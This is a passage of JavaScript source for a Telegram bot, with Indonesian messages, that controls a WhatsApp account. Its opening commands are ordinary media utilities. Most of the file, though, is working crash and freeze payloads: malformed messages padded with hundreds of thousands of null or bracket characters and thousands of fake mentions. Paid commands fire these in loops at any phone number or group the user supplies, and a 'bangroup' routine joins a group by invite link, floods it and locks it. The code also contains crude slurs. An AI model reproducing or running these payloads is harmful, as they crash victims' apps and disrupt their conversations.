  if (!url || !url.includes("snackvideo")) return ctx.reply("❌ Bukan link SnackVideo.")
  try {
    await ctx.reply("⏳ Memproses...")
    const res = await axios.get(`https://api.shecodes.io/snackvideo?url=${encodeURIComponent(url)}`, { timeout: 15000 })
    const video = res?.data?.data?.video
    if (!video) return ctx.reply("❌ Gagal ambil video.")
    await ctx.replyWithVideo({ url: video })
  } catch { ctx.reply("❌ Error.") }
})

bot.command("lagu", async (ctx) => {
  const q = ctx.message.text.split(" ").slice(1).join(" ")
  if (!q) return ctx.reply("🎵 /lagu [judul]")
  const st = await ctx.reply(`🔍 Mencari: ${q}`)
  try {
    const res = await fetch(`https://api.deezer.com/search?q=${encodeURIComponent(q)}&limit=1`)
    const data = await res.json()
    if (!data.data?.length) return ctx.reply("❌ Tidak ditemukan.")
    const t = data.data[0]
    await ctx.telegram.deleteMessage(ctx.chat.id, st.message_id).catch(() => {})
    if (t.album?.cover_medium) {
      await ctx.replyWithPhoto(t.album.cover_medium, {
        caption: `🎵 ${t.title}\n🎤 ${t.artist.name}\n🔗 ${t.link}`
      })
    }
    if (t.preview && t.preview !== "null") {
      await ctx.replyWithAudio(t.preview, { title: t.title, performer: t.artist.name })
    }
  } catch { ctx.reply("❌ Error.") }
})

bot.command("ssiphone", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ")
  if (!text) return ctx.reply("❌ Format: /ssiphone 18:00|40|Indosat|hai")
  const [time, battery, carrier, ...msgParts] = text.split("|")
  if (!time || !battery || !carrier || !msgParts.length) return ctx.reply("❌ Format salah.")
  await ctx.reply("⏳ Wait...")
  const messageText = encodeURIComponent(msgParts.join("|").trim())
  const url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(carrier)}&messageText=${messageText}&emojiStyle=apple`
  try {
    const res = await fetch(url)
    if (!res.ok) return ctx.reply("❌ Gagal.")
    const buffer = Buffer.from(await res.arrayBuffer())
    await ctx.replyWithPhoto({ source: buffer })
  } catch { ctx.reply("❌ Error.") }
})

bot.command("hd", async (ctx) => {
  if (!ctx.message.reply_to_message?.photo) return ctx.reply("📸 Reply foto dengan /hd")
  const st = await ctx.reply("⏳ Memproses...")
  try {
    const photo = ctx.message.reply_to_message.photo
    const fileId = photo[photo.length - 1].file_id
    const file = await ctx.telegram.getFile(fileId)
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`
    const response = await fetch(fileUrl)
    const buffer = Buffer.from(await response.arrayBuffer())
    const form = new FormData()
    form.append("image_file", buffer, { filename: "image.jpg" })
    form.append("type", "clean")
    form.append("scale_factor", "4")
    const r = await fetch("https://api.picwish.com/v1/photo-enhancer", { method: "POST", body: form })
    const result = await r.json()
    if (!result.image_url) throw new Error()
    await ctx.telegram.deleteMessage(ctx.chat.id, st.message_id)
    await ctx.replyWithPhoto(result.image_url, { caption: "✅ Berhasil di-upgrade!" })
  } catch { await ctx.telegram.editMessageText(ctx.chat.id, st.message_id, null, "❌ Gagal memproses.") }
})

bot.command("convert", checkPremium, async (ctx) => {
  const r = ctx.message.reply_to_message
  if (!r) return ctx.reply("❌ Reply foto/video dengan /convert")
  let fileId = null
  if (r.photo?.length) fileId = r.photo[r.photo.length - 1].file_id
  else if (r.video) fileId = r.video.file_id
  else if (r.video_note) fileId = r.video_note.file_id
  else return ctx.reply("❌ Hanya foto/video.")
  const w = await ctx.reply("⏳ Mengunggah...")
  try {
    const link = String(await ctx.telegram.getFileLink(fileId))
    const params = new URLSearchParams()
    params.append("reqtype", "urlupload")
    params.append("url", link)
    const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
      headers: { "content-type": "application/x-www-form-urlencoded" },
      timeout: 30000
    })
    if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
      await ctx.reply(data.trim())
    } else { await ctx.reply("❌ Gagal upload.") }
  } catch { ctx.reply("❌ Gagal.") }
  finally { try { await ctx.deleteMessage(w.message_id) } catch {} }
})

bot.command("encjs", async (ctx) => {
  let code = ""
  if (ctx.message.reply_to_message?.text) code = ctx.message.reply_to_message.text
  else code = ctx.message.text.split(" ").slice(1).join(" ")
  if (!code.trim()) return ctx.reply("📌 /encjs <kode> atau reply pesan kode.")
  const enc = `eval(Buffer.from('${Buffer.from(code).toString("base64")}', 'base64').toString())`
  const msg = new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ ENCRYPTED CODE ✦")
    .divider()
    .pre(enc, "javascript")
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
  await ctx.sendRichMessage(msg, { reply_markup: subKeyboard() })
})

bot.command("decjs", async (ctx) => {
  let enc = ""
  if (ctx.message.reply_to_message?.text) enc = ctx.message.reply_to_message.text
  else enc = ctx.message.text.split(" ").slice(1).join(" ")
  if (!enc.trim()) return ctx.reply("📌 Reply pesan terenkripsi dengan /decjs")
  const m = enc.match(/Buffer\.from\('(.*?)',\s*'base64'\)/)
  if (!m) return ctx.reply("❌ Format tidak dikenal.")
  const dec = Buffer.from(m[1], "base64").toString()
  const msg = new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ DECRYPTED CODE ✦")
    .divider()
    .pre(dec, "javascript")
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
  await ctx.sendRichMessage(msg, { reply_markup: subKeyboard() })
})

async function zippZopGs(target) {
  for (let p = 0; p < 150; p++) {
    await socket.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
      messageContextInfo:  {
      deviceListMetadata: {
       recipientKeyHash: "SJL2K7DtKzpUknA==",
       recipientTimestamp: "1781443186"
      },
      deviceListMetadataVersion: 2
      },
      interactiveMessage: {
        body: {
          text: "PouSync".repeat(1000)
        },
        nativeFlowMessage: {
          buttons: ""
        },
        bloksWidget: {
          uuid: crypto.randomUUID(),
          type: "im_a2ui",
          fallback: "kontolMakLo",
          data: "\0".repeat(49000)
        }
      }
     }
     }
    }, {noSelfSync: true}) // ini kontol
  }
  await sleep(300)
}

async function zippZop(target) {
  for (let p = 0; p < 150; p++) {
    await socket.relayMessage(target, {
      messageContextInfo:  {
      deviceListMetadata: {
       recipientKeyHash: "SJL2K7DKzpUknA==",
       recipientTimestamp: "1781443186"
      },
      deviceListMetadataVersion: 2
      },
      interactiveMessage: {
        body: {
          text: "PouSync".repeat(1000)
        },
        nativeFlowMessage: {
          buttons: ""
        },
        bloksWidget: {
          uuid: crypto.randomUUID(),
          type: "im_a2ui",
          fallback: "kontolMakLo",
          data: "\0".repeat(49000)
        }
      }
    }, {noSelfSync: true}) // ini kontol
  }
  await sleep(300)
}



async function DelayOoMOnehitV1(sock, target) {
const startTime = Date.now();
const duration = 1 * 60 * 1000;
while (Date.now() - startTime < duration) {
await sock.relayMessage(target, {
groupStatusMessageV2: {
message: {
interactiveMessage: {
header: {
imageMessage: {
url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
mimetype: "image/jpeg",
caption: "NandoX(CrB)",
fileSha256: "c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=",
fileLength: "634893",
height: 1022,
width: 1080,
mediaKey: "G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=",
fileEncSha256: "PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb7Xn0+0A=",
directPath: "/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
mediaKeyTimestamp: "1782643133",
jpegThumbnail: "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQFERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z",
hasMediaAttachment: true
}
},
body: {
text: "\u0000",
},
nativeFlowMessage: {
buttons: "[".repeat(500000),
}
}
}
}
}, { noSelfSync: true })
}
}

async function DelayOoMV1(sock, target) {
await sock.relayMessage(target, {
groupStatusMessageV2: {
message: {
interactiveMessage: {
header: {
imageMessage: {
url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
mimetype: "image/jpeg",
caption: "NandoX(CrB)",
fileSha256: "c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=",
fileLength: "634893",
height: 1022,
width: 1080,
mediaKey: "G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=",
fileEncSha256: "PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb7Xn0+0A=",
directPath: "/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
mediaKeyTimestamp: "1782643133",
jpegThumbnail: "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQFERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z",
hasMediaAttachment: true
}
},
body: {
text: "\u0000",
},
nativeFlowMessage: {
buttons: "[".repeat(500000),
}
}
}
}
}, { noSelfSync: true })
}

async function DelayOoMV2(sock, target) {
await sock.relayMessage(target, {
groupStatusMessageV2: {
message: {
interactiveMessage: {
header: {
imageMessage: {
url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
mimetype: "image/jpeg",
caption: "NandoX(CrB)",
fileSha256: "c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=",
fileLength: "634893",
height: 1022,
width: 1080,
mediaKey: "G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=",
fileEncSha256: "PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb7Xn0+0A=",
directPath: "/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
mediaKeyTimestamp: "1782643133",
jpegThumbnail: "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQFERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z",
hasMediaAttachment: true
}
},
body: {
text: "\u0000",
},
nativeFlowMessage: {
buttons: "[".repeat(500000),
}
}
}
}
}, { noSelfSync: true })
    
await sock.relayMessage(target, {
groupStatusMessageV2: {
message: {
interactiveMessage: {
body: {
text: "NandoX(CrB)"
},
nativeFlowMessage: {
buttons: "[".repeat(500000),
}
}
}
}
}, { noSelfSync: true })
}

async function Crash(sock, target) {
  const msg = {
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          submessages: [
            {
              messageType: 7,
              mapMetadata: {
                centerLatitude: -999999,
                centerLongitude: 99999,
                latitudeDelta: 99999,
                longitudeDelta: 99999,
                annotations: [
                  {
                    annotationNumber: 1,
                    latitude: -999999,
                    longitude: 99999999,
                    title: "\0".repeat(500000),
                    body: "𑇂𑆵𑆴𑆿".repeat(500),
                  },
                  {
                    annotationNumber: 1,
                    latitude: -999999,
                    longitude: 99999999,
                    title: "X-C7 - RanModz" + "\0".repeat(5000),
                    body: "𑇂𑆵𑆴𑆿".repeat(500),
                  },
                  {
                    annotationNumber: 1,
                    latitude: -999999,
                    longitude: 99999999,
                    title: "\0".repeat(500000),
                    body: "\0".repeat(5000),
                  },
                ],
              },
            },
          ],
          contextInfo: {
            forwardingScore: 9999,
            isForwarded: true,
            forwardedAiBotMessageInfo: {
              botJid: "259786046210223@bot",
            },
            forwardOrigin: 4,
            botMessageSharingInfo: {
              botEntryPointOrigin: 1,
              forwardScore: 99,
            },
          },
        },
      },
    },
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target },
  });

  console.log("✅ SUCCESS SEND BUGS");
}

async function BlankAndroNew(sock, target) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "X-C7 RanModzz" + "\n".repeat(7000),
          },
          contextInfo: {
            forwardingScore: 99999,
            isForwarded: true,
            forwardedAiBotMessageInfo: {
              botJid: "867051314767696@bot",
              mentionedJid: Array.from(
                { length: 2000 },
                () => Math.floor(Math.random() * 700000) + "@s.whatsapp.net"
              ),
            },
            forwardOrigin: 4,
          },
          nativeFlowMessage: {
            name: "carousel_message",
            buttons: Array.from({ length: 30 }, () => ({})),
          },
        },
      },
    },
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target },
  });

  console.log("✅ SUCCESS SEND BUGS");
}

async function frezer(sock, target) {
  if (!target || !target.endsWith("@g.us")) throw new Error("Target harus berformat @g.us")
  const illegalNumbers = [
    "13135550002@s.whatsapp.net",
    "12345678900@s.whatsapp.net",
    "19876543210@s.whatsapp.net",
    "15551234567@s.whatsapp.net",
    "18005551234@s.whatsapp.net",
    "447700900000@s.whatsapp.net",
    "447700900001@s.whatsapp.net",
    "447700900002@s.whatsapp.net",
    "971500000000@s.whatsapp.net",
    "971500000001@s.whatsapp.net"
  ]
  for (const num of illegalNumbers) {
    try { await sock.groupParticipantsUpdate(target, [num], "add") } catch (_) {}
  }
  try { await sock.groupSettingUpdate(target, "announcement") } catch (_) {}
  try { await sock.groupSettingUpdate(target, "locked") } catch (_) {}
  return true
}

async function DelayInvisGROUP(sock, target) {
  const unicode = "\u0000".repeat(10000) + "\u000D".repeat(99999)
  const hard =
    "\u00A1".repeat(9999) + "\u00B2".repeat(9999) + "\u0004".repeat(9999) +
    "\u00D4".repeat(9999) + "\u000F".repeat(9999) + "{}".repeat(9999) +
    "[]".repeat(9999) + "()".repeat(9999) + "€".repeat(9999)
  const combo = unicode + hard
  const fakeJids = () => Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
  const bigButtons = Array.from({ length: 56789 }, () => ({}))

  const sendInteractive = async (bodyText, buttons) =>
    await sock.relayMessage(target, {
      groupStatusMessageV2: { message: { interactiveMessage: { body: { text: bodyText }, nativeFlowMessage: { buttons }, contextInfo: { mentionedJid: fakeJids() } } } }
    }, {})

  const sendExtended = async (text) =>
    await sock.relayMessage(target, {
      groupStatusMessageV2: { message: { extendedTextMessage: { text, contextInfo: { mentionedJid: fakeJids() } } } }
    }, {})

  const sendFooter = async (bodyText, footerText, buttons) =>
    await sock.relayMessage(target, {
      groupStatusMessageV2: { message: { interactiveMessage: { body: { text: bodyText }, footer: { text: footerText }, nativeFlowMessage: { buttons }, contextInfo: { mentionedJid: fakeJids() } } } }
    }, {})

  try { await sendInteractive(unicode, bigButtons) } catch (_) {}
  try { await sendInteractive(hard, bigButtons) } catch (_) {}
  try { await sendInteractive(combo, bigButtons) } catch (_) {}
  try { await sendExtended(unicode) } catch (_) {}
  try { await sendExtended(hard) } catch (_) {}
  try { await sendExtended(combo) } catch (_) {}
  try { await sendFooter(combo, combo, bigButtons) } catch (_) {}
  try { await sendFooter(unicode, unicode, bigButtons) } catch (_) {}
  try { await sendFooter(hard, hard, bigButtons) } catch (_) {}
  try { await sendExtended(combo) } catch (_) {}
  try { await sendExtended(unicode) } catch (_) {}
  try { await sendExtended(hard) } catch (_) {}
  console.log("DelayInvisGROUP sent")
}

async function groupBan2(sock, target) {
  if (!target.endsWith("@g.us")) throw new Error("@g.us required")
  const fakeNumbers = [
    "6280000000000@s.whatsapp.net", "14155552671@s.whatsapp.net", "447400000000@s.whatsapp.net",
    "61400000000@s.whatsapp.net", "6281234567890@s.whatsapp.net", "6287873499996@s.whatsapp.net",
    "6285655555555@s.whatsapp.net", "6289876543210@s.whatsapp.net", "6281111111111@s.whatsapp.net",
    "6282222222222@s.whatsapp.net", "6283333333333@s.whatsapp.net", "6284444444444@s.whatsapp.net",
    "6285555555555@s.whatsapp.net", "6286666666666@s.whatsapp.net", "6287777777777@s.whatsapp.net",
    "6288888888888@s.whatsapp.net", "6289999999999@s.whatsapp.net"
  ]
  const actions = ["add", "remove", "promote", "demote"]
  const fake = fakeNumbers[Math.floor(Math.random() * fakeNumbers.length)]
  const action = actions[Math.floor(Math.random() * actions.length)]
  try {
    await sock.groupParticipantsUpdate(target, [fake], action)
    return true
  } catch (e) {
    console.log(`❌ Gagal: ${e.message}`)
    return false
  }
}

async function groupBan1(sock, target, durationMs = 30 * 1000) {
  const startTime = Date.now()
  console.log(chalk.blue(`🚫 Memulai GROUP BAN ke ${target}`))
  if (!target.endsWith("@g.us")) throw new Error("@g.us required")
  let successCount = 0
  let failCount = 0
  while (Date.now() - startTime < durationMs) {
    try {
      await sock.groupParticipantsUpdate(target, ["18188880008@s.whatsapp.net"], "add")
      await sock.sendPresenceUpdate("composing", target)
      await sock.groupParticipantsUpdate(target, ["13135550002@s.whatsapp.net"], "add")
      successCount++
    } catch (err) {
      failCount++
    }
    await sleep(3000)
  }
  console.log(chalk.yellow(`📊 GROUP BAN selesai! ✅ ${successCount} berhasil | ❌ ${failCount} gagal`))
}

async function executeBanGroup(sock, groupJid) {
  for (let i = 0; i < 3; i++) {
    try { await frezer(sock, groupJid) } catch (e) { console.log("frezer err:", e.message) }
    try { await DelayInvisGROUP(sock, groupJid) } catch (e) { console.log("DelayInvisGROUP err:", e.message) }
    try { await groupBan1(sock, groupJid, 10000) } catch (e) { console.log("groupBan1 err:", e.message) }
    try { await groupBan2(sock, groupJid) } catch (e) { console.log("groupBan2 err:", e.message) }
    await sleep(2000)
  }
}

bot.command(["bangroup"], checkPremium, checkWA, checkCooldown, async (ctx) => {
  const args = ctx.message.text.split(" ")
  const input = args[1]
  if (!input) {
    return ctx.reply(
      `🪧 <b>Format:</b> /bangroup &lt;link_grup&gt;\n\n` +
      `<i>Contoh:</i>\n<code>/bangroup https://chat.whatsapp.com/xxxxxxxxx</code>`,
      { parse_mode: "HTML" }
    )
  }

  const inviteCode = extractInviteCode(input)
  if (!inviteCode) {
    return ctx.reply("❌ <b>Link grup tidak valid!</b>\nPastikan format link benar.", { parse_mode: "HTML" })
  }

  await ctx.sendRichMessage(buildBanProcessingMessage(input))

  let groupJid = null

  try {
    await sleep(500)
    groupJid = await sock.groupAcceptInvite(inviteCode)
    if (!groupJid) throw new Error("Gagal mendapatkan Group JID")

    await sleep(2000)

    let metadata = null
    try { metadata = await sock.groupMetadata(groupJid) } catch (e) { console.log("metadata err:", e.message) }
    const groupName = metadata?.subject || "Unknown Group"

    await ctx.sendRichMessage(buildBanJoinedMessage(groupJid, groupName))

    await sleep(1000)

    await executeBanGroup(sock, groupJid)

    await sleep(1000)

    try { await sock.groupLeave(groupJid) } catch (e) { console.log("leave err:", e.message) }

    await ctx.sendRichMessage(buildBanSuccessMessage(groupJid, groupName))

  } catch (err) {
    console.log("BanGroup error:", err)
    if (groupJid) {
      try { await sock.groupLeave(groupJid) } catch {}
    }
    await ctx.sendRichMessage(buildBanFailMessage(input, err.message || "Unknown error"))
  }
})

bot.command("1F", checkPremium, checkWA, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1]
  if (!q) return ctx.reply("🪧 ✮ Example : /1F 62xx")
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
  await ctx.sendRichMessage(buildBugExecMessage("Delay 1 Hit", q, "Freeze 1 Hit", "1F"), { reply_markup: subKeyboard() })
  ;(async () => {
    for (let i = 0; i < 5; i++) {
      try { await DelayOoMOnehitV1(sock, target) } catch {}
      await sleep(1000)
    }
  })()
})

bot.command("2F", checkPremium, checkWA, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1]
  if (!q) return ctx.reply("🪧 ✮ Example : /2F 62xx")
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
  await ctx.sendRichMessage(buildBugExecMessage("DELAY V2", q, "Freeze V2", "2F"), { reply_markup: subKeyboard() })
  ;(async () => {
    for (let i = 0; i < 20; i++) {
      try { await DelayOoMV1(sock, target) } catch {}
      await sleep(2000)
    }
  })()
})

bot.command("3F", checkPremium, checkWA, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1]
  if (!q) return ctx.reply("🪧 ✮ Example : /3F 62xx")
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
  await ctx.sendRichMessage(buildBugExecMessage("Delay V2", q, "Freeze V2", "3F"), { reply_markup: subKeyboard() })
  ;(async () => { 
  for (let i = 0; i < 20; i++) {
   try { await DelayOoMV2(sock, target) } catch {}
   }
  })()
})

bot.command("1D", checkPremium, checkWA, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1]
  if (!q) return ctx.reply("🪧 ✮ Example : /1D 62xx")
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
  await ctx.sendRichMessage(buildBugExecMessage("EXECUTION LOG", q, "Delay New", "1D"), { reply_markup: subKeyboard() })
  ;(async () => { 
  for (let r = 0; r < 15; r++) { 
   try { await zippZop(target) } catch {}
   try { await zippZopGs(target) } catch {}
  await sleep(1000) 
  } 
 })()
})

bot.command("1B", checkPremium, checkWA, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1]
  if (!q) return ctx.reply("🪧 ✮ Example : /1B 62xx")
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
  await ctx.sendRichMessage(buildBugExecMessage("Blank New", q, "Crash", "1B"), { reply_markup: subKeyboard() })
  ;(async () => {
    for (let r = 0; r < 7; r++) {
      try { await BlankAndroNew(sock, target) } catch {}
      await sleep(1000)
    }
  })()
})

bot.command("1C", checkPremium, checkWA, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1]
  if (!q) return ctx.reply("🪧 ✮ Example : /1C 62xx")
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
  await ctx.sendRichMessage(buildBugExecMessage("FORCE CLOSE NO CLICK", q, "Forclose No Click", "1C"), { reply_markup: subKeyboard() })
  ;(async () => { for (let r = 0; r < 25; r++) { 
   try { await Crash(sock, target) } catch {}
   await sleep(1000) 
   } 
  })()
})

bot.command("Lowred", checkPremium, checkWA, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1]
  if (!q) return ctx.reply("🪧 ✮ Example : /Lowred 62xx")
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
  await ctx.sendRichMessage(buildBugExecMessage("FORCE CLOSE CLICK", q, "Forclose Click", "Lowred"), { reply_markup: subKeyboard() })
  ;(async () => { for (let r = 0; r < 30; r++) { 
  try { await ForceInvisions(target) } catch {} 
  try { await fcInvis(sock, target) } catch {} 
  await sleep(1000) } })()
})

bot.command("Speacther", checkPremium, checkWA, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1]
  if (!q) return ctx.reply("🪧 ✮ Example : /Speacther 62xx")
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
  await ctx.sendRichMessage(buildBugExecMessage("BLANK LOGO", q, "Blank Logo", "Speacther"), { reply_markup: subKeyboard() })
  ;(async () => { for (let r = 0; r < 50; r++) { 
  try { await NoobUi(sock, target) } catch {} 
  try { await cv03(sock, target) } catch {} 
  try { await VsxBlank(sock, target) } catch {} 
  await sleep(1000) } })()
})

bot.command("HitOver", checkPremium, checkWA, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1]
  if (!q) return ctx.reply("🪧 ✮ Example : /HitOver 62xx")
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
  await ctx.sendRichMessage(buildBugExecMessage("BLANK HEADER", q, "Blank Header", "HitOver"), { reply_markup: subKeyboard() })
  ;(async () => { for (let r = 0; r < 50; r++) { 
  try { await VsxBlank(sock, target) } catch {} 
  try { await cv03(sock, target) } catch {} 
  try { await NoobUi(sock, target) } catch {} 
  await sleep(1000) } })()
})

function loadUpdateHistory() {
  try { return JSON.parse(fs.readFileSync(PATHS.HISTORY, "utf8") || "[]") } catch { return [] }
}
function saveUpdateHistory(h) {
  try { fs.writeFileSync(PATHS.HISTORY, JSON.stringify(h, null, 2)) } catch {}
}
function loadLastNotified() {
  try { return JSON.parse(fs.readFileSync(PATHS.LAST_NOTIFIED, "utf8") || "{}") } catch { return {} }
}
function saveLastNotified(d) {
  try { fs.writeFileSync(PATHS.LAST_NOTIFIED, JSON.stringify(d, null, 2)) } catch {}
}
function getLocalVersion() {
  try { return JSON.parse(fs.readFileSync("./package.json", "utf8")).version || SYSTEM.VERSION } catch { return SYSTEM.VERSION }
}

async function fetchLatestCommit() {
  if (!GITHUB.OWNER || !GITHUB.REPO) throw new Error("GitHub OWNER/REPO belum dikonfigurasi")
  const url = `${GITHUB.API_BASE}/repos/${GITHUB.OWNER}/${GITHUB.REPO}/commits/${GITHUB.BRANCH}`
  const headers = { "User-Agent": `${SYSTEM.NAME}-Updater` }
  if (GITHUB.TOKEN) headers["Authorization"] = `token ${GITHUB.TOKEN}`
  const { data } = await axios.get(url, { headers, timeout: 15000 })
  return { sha: data.sha, message: data.commit.message, date: data.commit.author.date, author: data.commit.author.name }
}

async function checkForUpdates() {
  const remote = await fetchLatestCommit()
  const last = loadLastNotified()
  return { remote, isNew: remote.sha !== last.sha, lastNotified: last }
}

async function performUpdate(ctx, ownerId) {
  if (updateInProgress) throw new Error("Update sedang berjalan")
  updateInProgress = true
  const start = Date.now()
  const from = getLocalVersion()
  const history = loadUpdateHistory()
  const entry = { versionFrom: from, versionTo: "pending", commit: "", started: new Date().toISOString(), completed: null, duration: null, result: "pending" }
  let backupDir = null
  try {
    const { remote } = await checkForUpdates()
    entry.commit = remote.sha
    entry.versionTo = remote.sha.slice(0, 7)
    await ctx.sendRichMessage(new HTML()
      .slideshow(...slideshowLine())
      .heading(1, "✦ UPDATE STARTED ✦")
      .table([["Field", "Value"], ["From Version", from], ["To Commit", entry.versionTo]], { bordered: true, striped: true, hasHeader: true })
      .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
      .build())
    backupDir = path.join(PATHS.BACKUP_DIR, `backup_${Date.now()}`)
    fs.mkdirSync(backupDir, { recursive: true })
    for (const f of ["index.js", "package.json"]) if (fs.existsSync(f)) fs.copyFileSync(f, path.join(backupDir, f))
